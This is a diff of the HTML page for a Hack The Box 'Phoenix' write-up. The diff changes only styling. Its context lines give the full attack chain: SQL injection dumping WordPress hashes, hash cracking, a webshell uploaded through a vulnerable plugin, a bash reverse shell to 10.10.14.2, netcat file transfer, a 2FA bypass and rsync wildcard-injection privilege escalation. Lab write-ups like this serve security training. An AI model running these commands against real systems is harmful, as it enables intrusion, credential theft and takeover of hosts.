 [15:34:15] [INFO] fetching number of databases
@@ -370,7 +370,7 @@ Lets dump all the database names:</p>
 <p>Wordpress by default creates a table called <code v-pre>wp_users</code>. More info <a href="https://codex.wordpress.org/Database_Description#Table:_wp_users">here</a>.
 Inside this table it is stored details of the users. I&#x27;m interested in <code v-pre>user_login</code> and <code v-pre>user_pass</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">sqlmap -r subscribe.req --batch --risk 3 --level 5 --random-agent --technique T --dbms=mysql -D wordpress -T wp_users -C user_login,user_pass --dump
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">sqlmap -r subscribe.req --batch --risk 3 --level 5 --random-agent --technique T --dbms=mysql -D wordpress -T wp_users -C user_login,user_pass --dump
 
 +------------+--------------------------------------------------+
 | user_login | user_pass                                        |
@@ -392,7 +392,7 @@ Inside this table it is stored details of the users. I&#x27;m interested in <cod
 </doc-anchor-target>
 <p>Added the hashes into a file called <code v-pre>hashes.txt</code> and attempt to crack it:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ hashcat -O -m 400 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ hashcat -O -m 400 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
 ...
 
 Phoenix:phoenixthefirebird14
@@ -410,14 +410,14 @@ Jack:</code></pre>
 </doc-anchor-target>
 <p>Login using the administrator credentials <code v-pre>phoenix:phoenixthefirebird14</code> we are stopped by OTP:
 <figure class="content-center">
-    <img src="images/image3.png" alt="">
+    <img src="images/image3.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>I tried many ways of circunventing the OTP but nothing works.
 At this point I decided to re-enumerate the plugins installed on wordpress. Maybe we can find some vulnerable plugins. Reading the source code of the home page I could get some of them:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ curl -k https://phoenix.htb/ | grep plugins
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ curl -k https://phoenix.htb/ | grep plugins
 
 https://phoenix.htb/wp-content/plugins/accordion-slider-gallery (v1.4)
 https://phoenix.htb/wp-content/plugins/asgaros-forum (v1.15.13)
@@ -434,7 +434,7 @@ Wordpress stores its active plugins register in the database. It is usually loca
 </ul>
 <p>So i decided to play with the SQL injection a bit more and dump the <code v-pre>wp_options</code> table to see what is in this registry:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sqlmap -r subscribe.req --batch --risk 3 --level 5 --random-agent -D wordpress -T wp_options --dump
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sqlmap -r subscribe.req --batch --risk 3 --level 5 --random-agent -D wordpress -T wp_options --dump
 
 a:5:{i:0;s:89:&quot;/srv/www/wordpress/../../../opt/wordpress/wp-content/plugins/asgaros-forum/skin/style.css&quot;;i:1;s:92:&quot;/srv/www/wordpress/../../../opt/wordpress/wp-content/plugins/asgaros-forum/asgaros-forum.php&quot;;i:2;s:106:&quot;/srv/www/wordpress/../../../opt/wordpress/wp-content/plugins/accordion-slider-gallery/accordion-slider.php&quot;;i:3;s:86:&quot;/srv/www/wordpress/../../../opt/wordpress/wp-content/plugins/adminimize/adminimize.php&quot;;i:4;s:62:&quot;/srv/www/wordpress/wp-content/themes/twentytwentyone/style.css&quot;;}
 ...[snip]...
@@ -446,7 +446,7 @@ download-from-files/download-from-files.php...
 Reading the exploit, it abuses of an arbitrary file upload vulnerability where the plugin allow an unauthenticated user to upload php4 and phtml files.
 I will make a copy of <a href="https://github.com/flozz/p0wny-shell">PownyShell</a> , change the file extension to <code v-pre>.phtml</code> and upload to the web server using the exploit.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">~/htb/phoenix
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">~/htb/phoenix
 ❯ cp /opt/p0wny-shell/shell.php .
 
 ~/htb/phoenix
@@ -462,7 +462,7 @@ https://phoenix.htb/wp-admin/shell.phtml</code></pre>
 </doc-codeblock></div>
 <p>Browsing to <a href="https://phoenix.htb/wp-admin/shell.phtml">https://phoenix.htb/wp-admin/shell.phtml</a> we get our semi-interactive webshell!
 <figure class="content-center">
-    <img src="images/image4.png" alt="">
+    <img src="images/image4.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -474,11 +474,11 @@ https://phoenix.htb/wp-admin/shell.phtml</code></pre>
 </doc-anchor-target>
 <p>First of all, lets get a real tty. Start a netcat listener on our kali machine:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ nc -lnvp 4444</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ nc -lnvp 4444</code></pre>
 </doc-codeblock></div>
 <p>Run a bash reverse shell from the webshell:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">p0wny@shell:…/wordpress/wp-admin# bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1'</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">p0wny@shell:…/wordpress/wp-admin# bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1'</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="upgrade-tty">
     <h3>
@@ -487,7 +487,7 @@ https://phoenix.htb/wp-admin/shell.phtml</code></pre>
     </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">wp_user@phoenix:~/wordpress/wp-admin$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">wp_user@phoenix:~/wordpress/wp-admin$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 CTRL+Z
 
 ❯ stty raw -echo;fg                    
@@ -503,18 +503,18 @@ wp_user@phoenix:~/wordpress/wp-admin$ export TERM=xterm</code></pre>
 </doc-anchor-target>
 <p>Since we have some credentials extracted from the SQL injection I was trying to change user, however, the system would ask for a 2FA code:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">wp_user@phoenix:~/wordpress/wp-admin$ su phoenix
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">wp_user@phoenix:~/wordpress/wp-admin$ su phoenix
 Verification code:</code></pre>
 </doc-codeblock></div>
 <p>I remember reading a blog article that recommended looking at where is the 2FA implemented. Sometimes it only asks for 2FA in a specific service or IP. Looking at the access configuration file I saw that it would allow access from the network <code v-pre>10.11.12.13/24</code>. So probably we can circunvent the 2FA.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">wp_user@phoenix:~$ cat /etc/security/access-local.conf                                                                                                        
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">wp_user@phoenix:~$ cat /etc/security/access-local.conf                                                                                                        
 + : ALL : 10.11.12.13/24                                                                                                                                      
 - : ALL : ALL</code></pre>
 </doc-codeblock></div>
 <p>Running <code v-pre>ifconfig</code> revealed we are connected to that subnet via <code v-pre>eth0</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">wp_user@phoenix:~$ ifconfig                                                                                                                                   
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">wp_user@phoenix:~$ ifconfig                                                                                                                                   
 ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500                                                                                                  
         inet 10.10.11.149  netmask 255.255.254.0  broadcast 10.10.11.255                                                                                      
         inet6 fe80::250:56ff:feb9:954c  prefixlen 64  scopeid 0x20&lt;link&gt;                                                                                      
@@ -542,7 +542,7 @@ eth0: flags=195&lt;UP,BROADCAST,RUNNING,NOARP&gt;  mtu 1500
 </doc-anchor-target>
 <p>Lets SSH in to that network. I tried some credentials and the one that work was <code v-pre>editor:superphoenix</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">wp_user@phoenix:~$ ssh editor@10.11.12.13                                                                                                                     
+<pre translate="no" class="language-none"><code v-pre class="language-none">wp_user@phoenix:~$ ssh editor@10.11.12.13                                                                                                                     
 The authenticity of host '10.11.12.13 (10.11.12.13)' can't be established.                                                                                    
 ECDSA key fingerprint is SHA256:UFrZTjBNH3KNUbtCeiCkYGUImlWztCyRUVcMDDkKeu4.                                                                                  
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -568,7 +568,7 @@ editor@phoenix:~$</code></pre>
 </doc-anchor-target>
 <p>Enumerating the machine I see some interesting files in the <code v-pre>/backups</code> directory:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">editor@phoenix:/backups$ ls -la
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">editor@phoenix:/backups$ ls -la
 total 2000
 drwxr-x---  2 editor editor   4096 Mar 21 00:03 .
 drwxr-xr-x 20 root   root     4096 Feb 25 19:40 ..
@@ -578,13 +578,13 @@ drwxr-xr-x 20 root   root     4096 Feb 25 19:40 ..
 </doc-codeblock></div>
 <p>It seems that the system is creating a file every 3 minutes. I will transfer the oldest one to my machine for a closer look:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">❯ nc -l -p 1234 &gt; phoenix.htb.2022-03-20-23-57.tar.gz
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">❯ nc -l -p 1234 &gt; phoenix.htb.2022-03-20-23-57.tar.gz
 ...
 editor@phoenix:/backups$ nc -w 3 10.10.14.2 1234 &lt; phoenix.htb.2022-03-20-23-57.tar.gz</code></pre>
 </doc-codeblock></div>
 <p>Decompress it:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">❯ tar -xvzf phoenix.htb.2022-03-20-23-57.tar.gz    
+<pre translate="no" class="language-none"><code v-pre class="language-none">❯ tar -xvzf phoenix.htb.2022-03-20-23-57.tar.gz    
 dbbackup.sql
 tar: dbbackup.sql: time stamp 2022-03-21 07:57:01 is 163.536085848 s in the future</code></pre>
 </doc-codeblock></div>
@@ -592,7 +592,7 @@ tar: dbbackup.sql: time stamp 2022-03-21 07:57:01 is 163.536085848 s in the futu
 But how this is happening? I tried running <code v-pre>pspy</code> to monitor the processes running but no luck! Enumerated the cronjobs and got nothing!</p>
 <p>Decided to go deeper in enumerating the machine when I found an interesting binary in the <code v-pre>/usr/local/bin</code> directory:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">editor@phoenix:/usr/local/bin$ ls -la
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">editor@phoenix:/usr/local/bin$ ls -la
 total 24
 drwxr-xr-x  2 root root  4096 Feb 13 20:11 .
 drwxr-xr-x 10 root root  4096 Jul 31  2020 ..
@@ -600,7 +600,7 @@ drwxr-xr-x 10 root root  4096 Jul 31  2020 ..
 </doc-codeblock></div>
 <p>It is a binary and I cannot read it in plain-text. So I setup another tty with <code v-pre>pspy</code> running and executed the binary to see what is doing:
 <figure class="content-center">
-    <img src="images/image6.png" alt="">
+    <img src="images/image6.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -619,25 +619,25 @@ drwxr-xr-x 10 root root  4096 Jul 31  2020 ..
 The idea is to inject code since <code v-pre>rsync</code> might be using a wildcard to get all the file names.
 We can create a file that will add an argument to the <code v-pre>rsync</code> command and execute a bash script. The file <code v-pre>shell.sh</code> will make a copy of bash and set the SUID permissions to it.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">editor@phoenix:/backups$ echo 'cp /usr/bin/bash /tmp/rootbash;chmod +s /tmp/rootbash' &gt; shell.sh
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">editor@phoenix:/backups$ echo 'cp /usr/bin/bash /tmp/rootbash;chmod +s /tmp/rootbash' &gt; shell.sh
 editor@phoenix:/backups$ chmod +x shell.sh
 editor@phoenix:/backups$ touch &quot;/backups/-e sh shell.sh&quot;</code></pre>
 </doc-codeblock></div>
 <p>The <code v-pre>/backups</code> directory should look like this. Now we just wait for the cronjob:
 <figure class="content-center">
-    <img src="images/image7.png" alt="">
+    <img src="images/image7.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>And here it is, we have a copy of  <code v-pre>bash</code> with the SUID bit:
 <figure class="content-center">
-    <img src="images/image8.png" alt="">
+    <img src="images/image8.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Lets get a root shell:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">editor@phoenix:/tmp$ ./rootbash -p
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">editor@phoenix:/tmp$ ./rootbash -p
 
 rootbash-5.0$ id
 uid=1002(editor) gid=1002(editor) euid=0(root) egid=0(root) groups=0(root),1002(editor)
@@ -668,23 +668,23 @@ drwxr-xr-x  2 root root  4096 Feb 25 15:07 .vim
                                 <!-- Required only on API pages -->
                                 <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                             </div>
-                            <footer class="clear-both">
+                            <footer id="retype-content-footer" class="clear-both">
                             
-                                <nav class="flex mt-14">
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/overgraph/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/overgraph/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
-                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
                                                 <span class="block mt-1">Overgraph</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/retired/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/retired/">
                                             <span>
-                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
                                                 <span class="block mt-1">Retired</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
@@ -694,24 +694,24 @@ drwxr-xr-x  2 root root  4096 Feb 25 15:07 .vim
                             </footer>
                         </main>
                 
-                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
-                            <footer class="flex flex-wrap items-center justify-between">
-                                <div>
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div id="retype-footer-links" class="print:hidden">
                                     <ul class="flex flex-wrap items-center text-sm">
                                     </ul>
                                 </div>
-                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. Caue All rights reserved.</p></div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. Caue All rights reserved.</p></div>
                             </footer>
                         </div>
                     </div>
                 
                     <!-- Rendered if sidebar right is enabled -->
                     <!-- Sidebar right skeleton-->
-                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
                         <div class="pl-5">
-                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                         </div>
                     </div>
                 
@@ -727,7 +727,7 @@ drwxr-xr-x  2 root root  4096 Feb 25 15:07 .vim
     </div>
 
 
-    <div id="docs-overlay-target"></div>
+    <div id="retype-overlay-target"></div>
 
     <script data-cfasync="false">window.__DOCS__ = { "title": "Phoenix", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
